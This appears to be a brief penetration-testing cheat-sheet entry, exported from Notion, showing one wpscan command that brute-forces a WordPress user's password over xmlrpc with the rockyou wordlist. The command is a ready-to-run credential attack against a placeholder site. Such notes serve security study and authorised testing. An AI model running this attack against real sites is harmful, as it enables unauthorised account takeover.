# wpscan brute-force example

OS: Linux, Web
Description: wpscan brute force
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21)
Target_Technology: wordpress (https://www.notion.so/wordpress-1444c8e5237680e78fa3df9e89b4bd65?pvs=21)

```jsx
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>
```